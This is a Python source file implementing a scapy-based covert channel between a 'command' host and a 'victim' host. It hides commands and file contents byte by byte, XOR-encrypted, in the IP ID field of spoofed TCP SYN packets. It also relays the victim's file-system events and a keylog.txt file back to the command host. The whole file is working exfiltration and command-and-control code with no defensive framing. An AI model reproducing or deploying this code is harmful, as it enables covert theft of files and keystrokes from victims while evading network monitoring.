from scapy.all import *
from scapy.layers.inet import *
from encryption import generate_key, xor_encrypt_decrypt

class CovertChannel:
    def __init__(self, cmd_addr, victim_addr, cmd_port, victim_port, key=generate_key()):
        self.cmd_addr = cmd_addr
        self.victim_addr = victim_addr
        if victim_port == 0:
            self.victim_port = random.randint(1, 65535)
        else:
            self.victim_port = victim_port
        self.cmd_port = cmd_port
        self.file_name = None
        self.cmd = None
        self.is_dir = False
        self.path = f"downloads/{self.victim_addr}"
        self.key = key
        self.is_watching = False

    def set_filename(self, file_name):
        self.file_name = file_name

    def send_data(self, for_victim: bool, event=None):
        if for_victim:
            src_addr = self.cmd_addr
            src_port = self.cmd_port
            dst_addr = self.victim_addr
            dst_port = self.victim_port
        else:
            src_addr = self.victim_addr
            src_port = self.victim_port
            dst_addr = self.cmd_addr
            dst_port = self.cmd_port

        if self.cmd is not None:
            print(f"COVERT:: SENDING {self.cmd}")
            format_len_msg = "{:04d}".format(len(str(self.cmd)))
            data = f"0000{format_len_msg}{self.cmd}".encode()
            self.covert_send(data, src_addr, dst_addr, src_port, dst_port)

        elif self.file_name and not self.is_dir:
            print(f"COVERT:: SENDING {self.file_name}")
            format_len_name = "{:02d}".format(len(self.file_name))

            if event == "IN_MOVE_SELF" or event == "IN_MOVED_FROM":
                data = f"11{format_len_name}0000{self.file_name}".encode()
                self.covert_send(data, src_addr, dst_addr, src_port, dst_port)
                return
            
            if len(str(os.stat(self.file_name).st_size)) <= 4:
                format_len_msg = "{:04d}".format(os.stat(self.file_name).st_size)
            else:
                print(f"COVERT:: Error Occurred")
                exit()
            if event == "IN_MODIFY" or event == "IN_MOVED_TO" or event == "IN_CREATE":
                data = f"10{format_len_name}{format_len_msg}{self.file_name}".encode()
            try:
                data += open(self.file_name, "rb").read()
            except Exception as e:
                print(e)
            self.covert_send(data, src_addr, dst_addr, src_port, dst_port)

        elif self.file_name and self.is_dir:
            format_len_name = "{:02d}".format(len(str(self.file_name)))
            if event == "IN_MODIFY" or event == "IN_MOVED_TO" or event == "IN_CREATE":
                data = f"20{format_len_name}0000{self.file_name}".encode()
            elif event == "IN_MOVE_SELF" or event == "IN_MOVED_FROM":
                data = f"21{format_len_name}0000{self.file_name}".encode()
            self.covert_send(data, src_addr, dst_addr, src_port, dst_port)


    def receive_data(self, for_victim: bool):
        is_file = self.get_packets(1, for_victim)[0]
        if is_file == '1':
            is_file = True
            is_dir = False
        elif is_file == '2':
            is_dir = True
            is_file = False
        else:
            is_file = False
            is_dir = False

        event = int("".join(self.get_packets(1, for_victim)))
        file_name_len = int("".join(self.get_packets(2, for_victim)))
        msg_len = int("".join(self.get_packets(4, for_victim)))
        msg = "".join(self.get_packets(msg_len + file_name_len, for_victim))
        
        if is_file:
            filename = msg[:file_name_len]
            if filename == 'keylog.txt' or not self.is_watching:
                if not for_victim:
                    filename = self.path + f'/{filename}'
                with open(filename, 'wb') as f:
                    f.write((msg[file_name_len:]).encode())
                print(f"COVERT:: File Received, saved as {filename}")
                return

            if event:
                os.makedirs(os.path.dirname(self.path + f'/deleted/{filename}'), exist_ok=True)
                print(f"[Deleted] {filename} moved to {self.path}/deleted/{filename}")
                
                current_path = self.path + f'/watching/{filename}'
                deleted_path = self.path + f'/deleted/{filename}'
                if os.path.isdir(current_path):
                    if os.listdir(current_path):
                        for item in os.listdir(current_path):
                            item_path = os.path.join(current_path, item)
                            os.rename(item_path, deleted_path + f"/{item}")
                    os.rmdir(current_path)
                else:
                    os.rename(self.path + f'/watching/{filename}', self.path + f'/deleted/{filename}')
            else:
                filename = self.path + f'/watching/{filename}'
                with open(filename, 'wb') as f:
                    f.write((msg[file_name_len:]).encode())
                print(f"[File Received] saved as {filename}")

        elif is_dir:
            fname = self.path + '/watching/' + msg
            if not event:
                os.makedirs(fname, exist_ok=True)
            elif event:
                os.rmdir(fname)
                os.makedirs(self.path + f'/deleted/{msg}', exist_ok=True)

        else:
            return msg

    def get_packets(self, count: int, for_victim: bool):
        if for_victim:
            src_addr = self.cmd_addr
            dst_port = self.victim_port
        else:
            src_addr = self.victim_addr
            dst_port = self.cmd_port
        data = []

        def process_packet(incoming_packet):
            if not incoming_packet.haslayer(TCP) and not incoming_packet.haslayer(IP):
                return

            ch = chr(xor_encrypt_decrypt(incoming_packet[IP].id, self.key))
            data.append(ch)

        sniff(filter=f"dst port {dst_port} and src host {src_addr}", lfilter=lambda i: i[TCP].flags & 2,
              prn=process_packet, store=0,
              count=count)
        return data

    def __str__(self):
        return f"src_ip:{self.cmd_addr}src_port:{self.cmd_port}::dst_ip:{self.victim_addr}:{self.victim_port}::" \
               f"filename:{self.file_name}::cmd:{self.cmd}::dir:{self.is_dir}"


    def covert_send(self, data, src_addr, dst_addr, src_port, dst_port):
        for ch in data:
            ip_id = xor_encrypt_decrypt(ch, self.key)

            sr_packet = IP(
                src=src_addr, 
                dst=dst_addr, 
                id=ip_id) / TCP(sport=src_port, dport=dst_port, flags="S")
            time.sleep(0.05)
            send(sr_packet, verbose=False)
